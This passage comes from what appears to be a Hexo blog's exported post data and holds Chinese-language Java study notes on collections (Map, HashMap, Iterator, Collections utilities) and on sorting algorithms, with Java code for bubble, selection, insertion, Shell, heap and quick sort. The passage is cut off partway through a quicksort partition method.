class="number">12</span>,<span class="string">&quot;aew&quot;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">ts1.add(p); ts1.add(p1);</span><br><span class="line">ts1.add(p2); ts1.add(p3);</span><br></pre></td></tr></table></figure>



<h6 id="2、定制排序"><a href="#2、定制排序" class="headerlink" title="2、定制排序"></a>2、定制排序</h6><p>实现<code>comparator</code>接口，<strong>其在类不可以修改时使用</strong></p>
<p>重写<code>compare()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">arrayList.add(<span class="number">1</span>);</span><br><span class="line">arrayList.add(<span class="number">2</span>);</span><br><span class="line">arrayList.add(-<span class="number">1</span>);</span><br><span class="line">arrayList.add(<span class="number">30</span>);</span><br><span class="line">arrayList.add(<span class="number">12</span>);</span><br><span class="line">System.out.println(arrayList);</span><br><span class="line"></span><br><span class="line">Collections.sort(arrayList, <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o1-o2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">System.out.println(<span class="string">&quot;定制排序后&quot;</span>+arrayList);</span><br></pre></td></tr></table></figure>



<h3 id="三、Map"><a href="#三、Map" class="headerlink" title="三、Map"></a>三、Map</h3><blockquote>
<p> <strong>无序，一个键只能对应一个值</strong></p>
<p><strong>不可通过值来获取键</strong></p>
<ul>
<li><p>key:     <code>keySet()</code>    通过Set存储，不能重复,插入和取出的顺序不一致</p>
</li>
<li><p>value：<code>values()</code>   通过Collection存储，值能重复，取出和插入的顺序一致</p>
</li>
<li><p>  Map的Entry:无序不可重复，Entry随着key走           </p>
</li>
</ul>
</blockquote>
<h4 id="1、遍历方式"><a href="#1、遍历方式" class="headerlink" title="1、遍历方式"></a>1、遍历方式</h4><h5 id="1-1-entrySet"><a href="#1-1-entrySet" class="headerlink" title="1.1 entrySet"></a>1.1 entrySet</h5><blockquote>
<p>Set&lt;Map .Entry&lt;K,V&gt;&gt;  entrySet();</p>
<p>返回的是集合<strong>键值对的集合</strong>,使用Set进行接收，不需要进行强转</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set&lt;Map.Entry&gt; entries=map.entrySet();</span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:entries)&#123;</span><br><span class="line">    System.out.println(entry.getKey()+<span class="string">&quot;--&quot;</span>+entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="1-2-keySet"><a href="#1-2-keySet" class="headerlink" title="1.2 keySet"></a>1.2 keySet</h5><blockquote>
<p>获取键的set集合，values() 获取值的collection集合</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set s=map.keySet();</span><br><span class="line">Collection s1=map.values();</span><br><span class="line">System.out.println(s1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(Object key:map.keySet())&#123;</span><br><span class="line">    System.out.println(key+<span class="string">&quot;--&quot;</span>+map.get(key));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、HashMap"><a href="#2、HashMap" class="headerlink" title="2、HashMap"></a>2、HashMap</h4><p>HashMap的键不能重复，会覆盖；不可通过值来获取键</p>
<p>​        put(Object key,Object )，，putAll():</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">&quot;201&quot;</span>,<span class="string">&quot;离&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;202&quot;</span>,<span class="string">&quot;森&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;203&quot;</span>,<span class="string">&quot;青&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>contains()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> b=map.containsKey(<span class="string">&quot;201&quot;</span>);</span><br><span class="line"><span class="keyword">boolean</span> b1=map.containsValue(<span class="string">&quot;离&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>get()，<strong>通过key来得到值</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">map.get(<span class="string">&quot;201&quot;</span>);</span><br><span class="line">System.out.println(map.get(<span class="string">&quot;201&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>replace(); 替代</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">map.replace(<span class="string">&quot;201&quot;</span>,<span class="string">&quot;禁&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>remove() 移除，只是在容器中移除；clear();</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">map.remove(<span class="string">&quot;201&quot;</span>);</span><br><span class="line">System.out.println(map);</span><br></pre></td></tr></table></figure>



<h4 id="3、HashTable"><a href="#3、HashTable" class="headerlink" title="3、HashTable"></a>3、HashTable</h4><h4 id="4、TreeMap"><a href="#4、TreeMap" class="headerlink" title="4、TreeMap"></a>4、TreeMap</h4><p>​    通过key来排序（类似于TreeSet，但排序方式是红黑树）</p>
<h3 id="四、Iterator"><a href="#四、Iterator" class="headerlink" title="四、Iterator"></a>四、Iterator</h3><blockquote>
<p><strong>所有集合类都实现了iterator接口</strong></p>
</blockquote>
<p>例如：（1）ArrayList实现了iterator接口，调用iterator()方法返回值实现了多态</p>
<p>​           （2）调用ArrayList内部类（该内部类实现了iterator接口，防止内存泄露使用内部类）</p>
<p> 1、iterator():将元素封装进容器</p>
<p> 2、hasNext():boolean是否还有下一个元素</p>
<p> 3、next():返回下一个元素</p>
<p> 4、remove() : 移除，但不能指定元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Iterator iterator=list.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> i=(<span class="keyword">int</span>)iterator.next();</span><br><span class="line">            System.out.println(i);</span><br><span class="line"><span class="comment">//            System.out.println(iterator.next());</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h3 id="五、for-each"><a href="#五、for-each" class="headerlink" title="五、for-each"></a>五、for-each</h3><p>增强for，必须是实现java.lang.Iterable接口，重写iterator</p>
<p>格式：for(类型 临时变量：容器变量){  循环体 }</p>
<p>​            没有增加删除方法,只能遍历</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s=&#123;<span class="string">&quot;哦哦&quot;</span>,<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;ss&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(String s1:s)&#123;</span><br><span class="line">    System.out.println(s1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="六、Collections"><a href="#六、Collections" class="headerlink" title="六、Collections"></a>六、Collections</h3><blockquote>
<p>Collections:是集合进行工具操作的类，例如集合排序和二分查找等</p>
<p>Collection:是单列集合的父类，有List和Set的子接口</p>
</blockquote>
<p>sort(list) 自然排序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Collections.sort(list);</span><br></pre></td></tr></table></figure>

<p>binarySearch(list,key) 二分查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s=Collections.binarySearch(list,<span class="number">125</span>);</span><br></pre></td></tr></table></figure>

<p>synchronizedXXX(XXX):对线程不安全，改为线程安全</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List li=Collections.synchronizedList(list);</span><br></pre></td></tr></table></figure>



<p>max()  :查找集合的最大值</p>
<p>reverse(list):进行反转</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Collections.reverse(list);</span><br></pre></td></tr></table></figure>

<p>shuffle(list):元素随机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Collections.shuffle(list);</span><br></pre></td></tr></table></figure>



<img src="https://csn.damyoung.cn/image-20200731223511191.png" alt="image-20200731223511191" style="zoom:67%;" />

]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法</title>
    <url>/2020/12/25/08%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="排序算法分类"><a href="#排序算法分类" class="headerlink" title="排序算法分类"></a>排序算法分类</h2><p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzMyMjA2MzctMTA1NTA4ODExOC5wbmc" alt="image"></p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul>
<li><p><strong>内部排序：</strong>将需要处理的所有数据都加载到内部存储中进行排序</p>
</li>
<li><p><strong>外部排序：</strong>数据量过大，无法全部加载到内存中，需要借助外部存储进行排序</p>
</li>
<li><p><strong>稳定性：</strong>如果a原本在b前面，而a=b，排序之后a仍然在b前面</p>
</li>
<li><p>**In-place:**不占用额外内存</p>
</li>
<li><p><strong>Out-place:</strong> 占用额外内存</p>
</li>
<li><p><strong>空间复杂度</strong></p>
</li>
<li><p><strong>时间复杂度O(n)：</strong>1、用常数1代替运行时间中的所有加法常数</p>
</li>
</ul>
<p>​                                2、修改只保留最高阶项</p>
<p>​                                3、去掉最高阶的系数</p>
<ul>
<li><strong>常数阶O(1)&lt;O(log 2 n)&lt;O(n)&lt;O(nlog2n)&lt;O(n2)&lt;O(n3)&lt;O(2^n)&lt;阶乘O(n!)</strong></li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20200905224810577.png" alt="image-20200905224810577"></p>
<p>O(n):线性阶for循环</p>
<p>O(nlog2n):线性对数阶</p>
<p>O(n^2):平方阶</p>
<a id="more"></a>

<h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzMwNDMxNjgtMTg2NzgxNzg2OS5wbmc" alt="img"></p>
<p><strong>还取决于n的规模</strong></p>
<p>冒泡、选择、插入排序：O(n^2)</p>
<p>希尔、归并、快速排序：O(nlog2n)</p>
<p>基数排序：O(n*k)</p>
<h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><p>bubble sort 体现出一种<strong>相邻元素比较并进行交换</strong>的思想</p>
<blockquote>
<ul>
<li><p>第一轮循环：相邻俩个元素交换，将大的元素放在后面；依次交换将最大的元素放在最后面</p>
</li>
<li><p>第二轮循环：相邻元素交换，但交换次数少一次</p>
</li>
</ul>
</blockquote>
<p><strong>思想</strong>：每俩个元素进行比较交换，大数放在后面，排序结束后最大值位于数组最后面</p>
<p><strong>优化：</strong>如果发现在某趟排序中，没有发生一次交换，可以提前结束冒泡排序</p>
<p><strong>时间复杂度</strong>：最佳T(n)=O(n),最差 T(n)=O(n^2)</p>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjMyMzg0NDktMjE0NjE2OTE5Ny5naWY" alt="image"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arr.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="comment">//用于判断是否发生交换，若无发生交换，则已经排序好的数组</span></span><br><span class="line">                flag = <span class="keyword">true</span>;</span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//用于判断当前循环的排序是否可以提前结束</span></span><br><span class="line">        <span class="keyword">if</span> (!flag)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//重置flag</span></span><br><span class="line">            flag=<span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;冒泡排序的结果是:&quot;</span>+Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>Select Sort 体现的是一种在余下数组中选举出最小元素的思想</p>
<blockquote>
<p>外层循环进行length-1次，内层循环进行length-1次（但起始位i+1）</p>
<ul>
<li>第一次循环：遍历数组除第一个元素，直接找出最小的值，<strong>标记出该最小值的位序</strong>，与第一个元素交换。</li>
<li>第二次循环：遍历数组（除了第一和第二个元素）直接找出最小的值，标记出该最小值的位序，与第二个元素交换。</li>
</ul>
</blockquote>
<p><strong>思想</strong>：先定义第一个元素为最小数，遍历除第一个元素以外元素找出最小值的位序，与第一个元素进行交换</p>
<p><strong>时间复杂度：</strong>T(n)=O(n^2)</p>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjQ3MTk1OTAtMTQzMzIxOTgyNC5naWY" alt="image"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length-<span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//每轮排序最小元素的位序</span></span><br><span class="line">        min=i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt;arr.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[min]&gt;arr[j])&#123;</span><br><span class="line">                min=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//arr[i]是每轮排序交换点</span></span><br><span class="line">        <span class="keyword">if</span>(min!=i)&#123;</span><br><span class="line">            temp=arr[i];</span><br><span class="line">            arr[i]=arr[min];</span><br><span class="line">            arr[min]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;选择排序的结果是:&quot;</span>+Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><p>InsertSort体现的一种在<strong>有序区插入元素</strong>使得数组有序的思想</p>
<blockquote>
<ul>
<li>以第二个元素开始，将插入元素在有序区进行顺序遍历比较,标记出插入位置</li>
<li>后面元素后移</li>
<li>将新元素放人空位</li>
</ul>
</blockquote>
<p><strong>思想</strong>：分为<strong>前段有序区和后段无序区</strong>，元素在有序区中遍历比较找出插入位置，插入位置后的元素后移</p>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjU2NDUyNzctMTE1MTEwMDAwMC5naWY" alt="image"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        temp=arr[i];</span><br><span class="line">        j=i-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (j&gt;=<span class="number">0</span> &amp;&amp; arr[j]&gt;=temp)&#123;</span><br><span class="line">            <span class="comment">//元素后移</span></span><br><span class="line">            arr[j+<span class="number">1</span>]=arr[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这时j的值为插入位置的前一个元素</span></span><br><span class="line">        arr[j+<span class="number">1</span>]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;插入排序的结果是:&quot;</span>+Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h1><p>shell Sort又称为缩小增量排序，体现在直接插入排序基础上，以<strong>增量形式进行分组，优先对远处的元素进行排序</strong>。</p>
<p><strong>时间复杂度：</strong>T(n) =O(nlog2n)</p>
<p><strong>思想</strong></p>
<ul>
<li>按下标进行一定增量分组，对每组使用直接插入排序；</li>
<li>随着增量逐渐减少，当增量减至1时，此时就成了一组</li>
</ul>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTE5MjY5OS8yMDE4MDMvMTE5MjY5OS0yMDE4MDMxOTA5NDExNjA0MC0xNjM4NzY2MjcxLnBuZw" alt="image"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shellSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> k =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> gap=arr.length/<span class="number">2</span>; gap&gt;<span class="number">0</span>; gap=gap/<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">//插入排序写法</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = gap; j &lt; arr.length; j++) &#123;</span><br><span class="line">            temp=arr[j];</span><br><span class="line">            k=j-gap;</span><br><span class="line">            <span class="keyword">while</span> (k&gt;=<span class="number">0</span> &amp;&amp; arr[k]&gt;=temp)&#123;</span><br><span class="line">                <span class="comment">//元素后移</span></span><br><span class="line">                arr[k+gap]=arr[k];</span><br><span class="line">                k-=gap;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[k+gap]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;希尔排序的结果是:&quot;</span>+Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h1><p>堆排序也是一种选择排序</p>
<p><strong>时间复杂度</strong>：最坏最好都是<code>O(nlogn)</code></p>
<h2 id="堆的概念"><a href="#堆的概念" class="headerlink" title="堆的概念"></a>堆的概念</h2><p>堆可以用数组来表示，这是因为堆是完全二叉树，而完全二叉树很容易就存储在数组中(按层序排序)</p>
<p><strong>升序采用大顶堆，降序采用小顶堆</strong></p>
<blockquote>
<p>**注意:**没有要求其左右孩子的大小关系</p>
</blockquote>
<h3 id="大顶堆"><a href="#大顶堆" class="headerlink" title="大顶堆"></a>大顶堆</h3><p>每个非叶子节点的值都大于或等于其左右孩子节点的值，称为<strong>大顶堆</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">arr[i] &gt;= arr[2i+<span class="number">1</span>] &amp;&amp; arr[i] &gt;= arr[2i+<span class="number">2</span>]  </span><br></pre></td></tr></table></figure>

<h3 id="小顶堆"><a href="#小顶堆" class="headerlink" title="小顶堆"></a>小顶堆</h3><p>每个非叶子节点的值都小于或等于其左右孩子节点的值，称为<strong>小顶堆</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">arr[i] &lt;= arr[2i+<span class="number">1</span>] &amp;&amp; arr[i] &lt;= arr[2i+<span class="number">2</span>]  </span><br></pre></td></tr></table></figure>

<h2 id="堆排序-1"><a href="#堆排序-1" class="headerlink" title="堆排序"></a>堆排序</h2><p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzEzMDg2OTktMzU2MTM0MjM3LmdpZg" alt="image"></p>
<h3 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h3><ul>
<li>将排序序列构造成一个大顶堆，序列的最大值即是堆顶根节点</li>
<li>将该最大值与序列末尾元素交换，末尾就成了最大值</li>
<li>再将剩余n-1元素<strong>重新构成一个堆</strong>，得到n个元素的次小值。反复执行</li>
</ul>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul>
<li>判断<strong>非叶子节点</strong>是否符合大顶堆，不符合则进行交换，最后得到一个<strong>初始大顶堆</strong><ul>
<li>最后一个非叶子结点下标为 <code>length/2-1</code></li>
<li>判断该非叶子结点和其左右子节点大小，若父节点小于子节点，则其与较大的子节点进行交换</li>
<li>若是父节点依旧大于子节点，则跳出循环，此时已经为大顶堆</li>
</ul>
</li>
<li>将堆顶元素和序列末尾元素进行交换  </li>
<li>对除末尾元素外，重复以上操作</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 构建大顶堆</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> i 待调整的数组元素的位置</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> length 数组的长度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">adjustHeap</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> i,<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp=arr[i];</span><br><span class="line">    <span class="comment">//选定的排序节点，会构建以该节点为root节点的最大堆</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k =i*<span class="number">2</span>+<span class="number">1</span>; k &lt;length; k=k*<span class="number">2</span>+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//左右结点比较，若存在右节点比较大，则使用右节点进行比较</span></span><br><span class="line">        <span class="keyword">if</span> (k+<span class="number">1</span>&lt;length &amp;&amp; arr[k]&lt;arr[k+<span class="number">1</span>])&#123;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//若子节点大于父节点，赋值</span></span><br><span class="line">        <span class="keyword">if</span> (arr[k]&gt;temp) &#123;</span><br><span class="line">            arr[i]=arr[k];</span><br><span class="line">            <span class="comment">//赋值i使得i成为子节点，即下一次比较的父节点</span></span><br><span class="line">            i=k;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将temp放到最终的位置</span></span><br><span class="line">    arr[i]=temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 选择排序之堆排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">headSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">    <span class="comment">//构建初始大顶堆，从最后一个非叶子节点开始</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = arr.length/<span class="number">2</span>-<span class="number">1</span>; i &gt;=<span class="number">0</span> ; i--) &#123;</span><br><span class="line">        adjustHeap(arr,i,arr.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//由于交换之后，改变的只是root和末尾节点，所以仅需要对root节点进行构建最大堆(1次)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=arr.length-<span class="number">1</span>;j&gt;<span class="number">0</span>;j--)&#123;</span><br><span class="line">        <span class="comment">//此时已经是初始大顶堆，进行交换，下一次循环找出次大节点</span></span><br><span class="line">        swap(arr,<span class="number">0</span>,j);</span><br><span class="line">        adjustHeap(arr,<span class="number">0</span>,j);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;堆排序的结果是:&quot;</span>+Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><blockquote>
<p>Quicksort </p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20200906162510519.png" alt="image-20200906162510519" style="zoom:80%;" />

<p><strong>思想</strong>：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。</p>
<ul>
<li>从数列中挑出一个元素，称为 “基准”（pivot）</li>
<li>重新排序数列，所有比基准值小的元素放在基准前面，所有比基准值大的元素放在基准的后面（相同的数可以到任一边），该基准就处于数列的中间位置。这称为分区（partition）操作；</li>
<li>递归地（recursive）对小于基准值元素的子数列和大于基准值元素的子数列进行快速排序。</li>
</ul>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzA5MzYzNzEtMTQxMzUyMzQxMi5naWY" alt="image"></p>
<h2 id="挖坑法"><a href="#挖坑法" class="headerlink" title="挖坑法"></a>挖坑法</h2><p><strong>思路：</strong></p>
<ul>
<li><p>定义俩个指针，一个指向起始start,一个指向结尾end，指定基准<code>indexVal</code>,作为’坑’</p>
</li>
<li><p>依次移动左右指针,若指定坑为start，移动右指针寻找比<code>indexVal</code>大的值，填入坑中</p>
</li>
</ul>
<p>​        再移动左指针寻找比<code>indexVal</code>小的值，填入刚刚移动空出的位置</p>
<p><strong>性能分析：</strong>原地排序，不需要辅助数组，但是递归调用需要辅助栈</p>
<p><strong>最好的情况：</strong>能将数组对半分，递归调用次数才是最少。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 快速排序之挖坑法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left&lt;right)&#123;</span><br><span class="line">        <span class="comment">//找出基准位置</span></span><br><span class="line">        <span class="keyword">int</span> pivot=partition(arr,left,right);</span><br><span class="line">        quickSort(arr,left,pivot-<span class="number">1</span>);</span><br><span class="line">        quickSort(arr,pivot+<span class="number">1</span>,right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 划分,将数组分成以基准为辨别的左右俩组</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array 数组</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> left 开始</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> right  结束</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span>  返回枢轴下标</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="comment">//以第一个元素作为基准</span></span><br><span class="line">    <span class="keyword">int</span> indexVal=array[left];</span><br><span class="line">    <span class="keyword">while</span> (left&lt;right)&#123;</span><br><span class="line">        <span 